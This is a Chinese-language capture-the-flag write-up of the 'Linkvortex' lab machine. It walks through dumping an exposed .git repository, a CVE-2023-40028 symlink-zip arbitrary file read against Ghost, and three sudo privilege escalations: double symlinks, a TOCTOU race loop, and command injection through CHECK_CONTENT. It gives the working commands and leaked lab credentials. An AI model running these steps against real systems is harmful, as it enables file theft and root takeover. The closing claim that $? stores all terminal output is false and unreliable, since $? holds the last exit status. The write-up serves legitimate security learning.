# Linkvortex

- 練習日期:   2026/03/19
- 考點:       git-dumper、CVE-2023-40028、Symlinks、TOCTOU (Time-of-Check to Time-of-Use) 條件競爭、Linux 權限與系統安全機制。

## git-dumper

首先發現在 dev.linkvortex.htb 上有一個 .git 的目錄，表示我們可以使用 `git-dumper` 把整個 git repository 給下載下來。

下載後，本來想要 `grep -rain pass .` 但資料夾太多，也沒有找到什麼有用的東西。

可以先看看目前 git 的狀態 `git status`，發現有 `Dockerfile.ghost` 及 `ghost/core/test/regression/api/admin/authentication.test.js` 兩個檔案。

使用 `git diff --cached Dockerfile.ghost` ，發現 config 存在 `/var/lib/ghost/config.production.json` 裡面；使用 `git diff --cached ghost/core/test/regression/api/admin/authentication.test.js`，發現一組帳號 `test@example.com` 和密碼 `OctopiFociPilfer45`。

靠賽發現登入 /ghost 後台的帳密為：

```
admin@linkvortex.htb
OctopiFociPilfer45
```

## CVE-2023-40028

這東西是說 Ghost 版本 < 5.59.1 時，可以透過上傳存有 symlink 的 zip 檔來任意存取伺服器上的檔案，具體做法如下 (當然你也可以選擇直接用 github 上的 [工具](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028))：

```bash
ln -s /etc/passwd ouo.png
zip -y -r ouo.zip ouo.png

# 上傳 ouo.zip 後

curl  http://linkvortex.htb/content/images/ouo.png
```

確認能夠正確存取 /etc/passwd 後，我們可以存取一些更有趣的資料，例如 `/var/lib/ghost/config.production.json`，可以存取到 linkvortex 主機的 bob 帳號密碼。

## 提權有三種作法

1. Double Symlinks
2. TOCTOU (Time-of-Check to Time-of-Use) 條件競爭
3. Exploit $CHECK_CONTENT

首先我們依照慣例輸入 `sudo -l` 來看看有哪些指令可以執行，發現我們可以以 root 權限來執行 `/opt/ghost/clean_symlink.sh`。進一步細看 `/opt/ghost/clean_symlink.sh`，他分為幾個步驟：

    1. 先檢查 CHECK_CONTENT 是否存在
    2. 輸入的檔案結尾是否為 .png
    3. 若 .png 檔存取機密資料，則會把它移除掉
    4. 若否，則把檔案移到 /var/quarantined 底下，並印出檔案內容

### Double Symlinks

我們發現 clean_symlink.sh 只會檢查輸入的檔案是否會存取到機敏資料，不過只要連第二次它就檢查不到了。不過在此之前，我們需要避免在某些 **Linux 標記為系統安全** 的目錄中進行操作。

```bash
sysctl fs.protected_symlinks
## 輸出為 1 表示 Linux 有啟用保護機制，非檔案擁有者無法存取該檔案
fs.protected_symlinks = 1

## 所以我們要避免有啟用保護機制的目錄：
find / -type d -perm -0002 -perm -1000 2>/dev/null
/tmp
/dev/shm
/var/tmp
...
```

接著就簡單了，直接建立 a -> b -> /root/root.txt 的雙重 symlink 就可以了：

```bash
ln -s /root/root.txt /home/bob/b        # 也可以去存取 /root/.ssh/id_rsa 來取得 ssh 金鑰
ln -s /home/bob/b /home/bob/a
CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/a.png
```

### TOCTOU (Time-of-Check to Time-of-Use) 條件競爭

簡單的說就是用 race condition 的方式來修改被丟到 /var/quarantined 的檔案 symlink，具體做法如下：

```bash
# 終端機 1
while true; do ln -sf /root/root.txt /var/quarantined/toctou.png; done

# 終端機 2
ln -s /home/bob/.bashrc /dev/shm/toctou.png
CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh toctou.png
```

### Exploit $CHECK_CONTENT

可以觀察一下 clean_symlink.sh 的內容，不難發現其中有這樣一段程式碼：

```bash
if $CHECK_CONTENT;then
    # ... 省略 ...
fi
```

但對於 bash 的邏輯，它會認為 $CHECK_CONTENT 是一個指令，因此我們可以把 $CHECK_CONTENT 設定成一個惡意的指令來執行，直接彈出 shell 超嗨，例如：

```bash
ln -s a.png     # 這邊指去哪裡根本不重要
CHECK_CONTENT=bash sudo bash /opt/ghost/clean_symlink.sh a.png
```

如果要修好這個漏洞，最簡單的方式就是把 if 條件改成 `if [ "$CHECK_CONTENT" = "true" ]; then`，這樣就不會被當成指令來執行了。

## 其他雜記

- nmap 輸入 `ip` 或 `domain name` 返回的結果會不一樣，這是因為 Name-based Virtual Hosting 的關係。 

- 終端機中所有的輸出結果都會先暫存在 `$?` 當中，我們可以用以下的小實驗來證明：

```bash
false ; echo $?     # 輸出為 1，表示上一個指令執行失敗
true ; echo $?      # 輸出為 0，表示上一個指令執行成功
```